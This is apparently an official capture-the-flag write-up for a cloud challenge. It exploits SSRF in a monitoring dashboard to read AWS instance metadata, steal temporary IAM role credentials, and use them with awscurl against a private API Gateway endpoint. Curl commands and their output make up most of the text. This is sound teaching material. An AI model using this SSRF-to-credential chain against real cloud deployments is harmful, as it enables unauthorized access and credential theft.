![banner](../../assets/banner.png)

<img src="../../assets/htb.png" style="zoom: 80%;" align=left /><font size="5">Dashboarded</font>

​	6<sup>th</sup> May 2025

​	Prepared By: polarbearer

​	Challenge Author(s): polarbearer

​	Difficulty: <font color=green>Very Easy</font>

​	Classification: Official







# Synopsis 

Dashboarded is a very easy cloud challenge that highlights how common web application vulnerabilities can be leveraged to gain further access to the underlying AWS infrastructure. A monitoring dashboard, accessible without prior authentication, makes requests to an internal API hosted on AWS. The application is vulnerable to Server-Side Request Forgery (SSRF), which allows players to access AWS metadata and retrieve credentials for an IAM role that is authorized to access a private endpoint on the API gateway.

# Description

After a relentless week-long effort, a lone Task Force operative successfully breached Volnaya's cloud-based ICS monitoring network, securing us permanent access to their front-end monitoring dashboard and opening a critical window into their industrial infrastructure. Your goal is to infiltrate deeper, locate sensitive data, and enable the Task Force to assume control of their core systems.

`IP: 3.15.107.79`

## Skills required 

* Knowledge of common Web Applications vulnerabilities 
* Familiarity with Cloud Technologies (AWS)

## Skills Learned

-  Leaking AWS credentials via SSRF
-  Using leaked credentials to access AWS services

# Challenge

We've given the IP address. Let's do a quick port scan to identify open ports and services. 

```bash
rustscan -a 3.15.107.79

Open 3.15.107.79:80
```

Only port 80 (HTTP) is listening. The web server is hosting a monitoring dashboard application.

![image-20250506140252919](assets/image-20250506140252919.png)

Looking at the source code, we see that the "Check Status" form has a hidden `url` field, pointing to an API Gateway endpoint.

```html
<form method="post">
    <input type="hidden" name="url" value="https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status">
    <button type="submit" class="action-btn">Check Status</button>
</form>
```

The `/status` endpoint can be accessed without authentication.

```bash
curl https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status

[{"name": "Power Plant Zeta-7", "status": "critical", "message": "Power Grid Disruption"}, {"name": "Water Treatment Facility Delta-9", "status": "operational", "message": "All checks OK"}, {"name": "Factory Alpha-12", "status": "warning", "message": "Minor Systems Failure"}]
```

The `/` route returns the list of available endpoints:

```bash
curl https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/

{"endpoints": ["/status", "/private"]
```

The `/private` endpoint, unlike the others, requires an authentication token.

```bash
curl https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private

{"message":"Missing Authentication Token"}
```

The way the `url` parameter is passed to the form makes the application potentially vulnerable to SSRF. Let's try accessing the `/private` endpoint:

```bash
curl -d "url=https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private" 3.15.107.79
```

Our request results in an `Invalid JSON data` error, with no additional information.

```html
<h2>Systems Under Empire Control</h2>
    Invalid JSON data:                                 <div>
                    <form method="post">
                        <input type="hidden" name="url" value="https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/status">
                        <button type="submit" class="action-btn">Check Status</button>
                    </form>
                </div>
```

Let's look at the instance [metadata](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html), which is available at `http://169.254.169.254/latest/meta-data`:

```bash
curl -d "url=http://169.254.169.254/latest/meta-data" 3.15.107.79
```

```html
                <h2>Systems Under Empire Control</h2>
                                    Invalid JSON data: ami-id
ami-launch-index
ami-manifest-path
block-device-mapping/
events/
hostname
iam/
identity-credentials/
instance-action
instance-id
instance-life-cycle
instance-type
local-hostname
local-ipv4
mac
metrics/
network/
placement/
profile
public-hostname
public-ipv4
public-keys/
reservation-id
security-groups
services/
system                                <div>
```

Metadata contain an `iam/` path, which means the instance has been granted some IAM role. Let's dig deeper:

```bash
curl -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials" 3.15.107.79
```

```html
Invalid JSON data: APICallerRole 
```

The instance was granted a role named `APICallerRole`. Let's retrieve the credentials:

```bash
curl -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/APICallerRole" 3.15.107.79
```

```html
                                    Invalid JSON data: Success
Invalid JSON data: 2025-05-06T11:59:18Z
Invalid JSON data: AWS-HMAC
Invalid JSON data: ASIARHJJMXKM7V6XKLOX
Invalid JSON data: O6aWaeBEbSQXgoyK8nOkH4j2B5BzhsxSEzggeVCu
Invalid JSON data: IQoJb3JpZ2luX2VjEJz//////////wEaCXVzLWVhc3QtMiJHMEUCIAbHkg<SNIP>
Invalid JSON data: 2025-05-06T18:14:17Z
```

We can use the credentials to connect to the `/private` endpoint with [awscurl](https://github.com/okigan/awscurl):

```bash
python3 -m venv venv
source venv/bin/activate
pip install awscurl

awscurl --region=us-east-2 --access_key "ASIARHJJMXKM7V6XKLOX" --secret_key "O6aWaeBEbSQXgoyK8nOkH4j2B5BzhsxSEzggeVCu" --security_token "IQoJb3JpZ2luX2VjEJz<SNIP>" https://inyunqef0e.execute-api.us-east-2.amazonaws.com/api/private | jq
```

A list of controlled systems is returned, which includes the challenge flag.

```json
[
  {
    "name": "Power Plant Zeta-7",
    "location": "Northern Province, Grid Sector 4",
    "operational_status": "Active",
    "critical_load": "75 MW",
    "backup_power_availability": "80%",
    "access_control_level": "Restricted Access (Level 3)",
    "emergency_shutdown_status": "Online",
    "encryption_key": "AES256-xyz123==",
    "admin_access_key": "PLANT-Z7-ADMLv3-2025",
    "sensor_id": "ZETA-7-SENSOR-001",
    "last_security_audit": "2025-04-15",
    "backup_power_system_id": "BPS-Z7-Backup-001"
  },

<SNIP>

  {
    "flag": "HTB{REDACTED}"
  },   
```



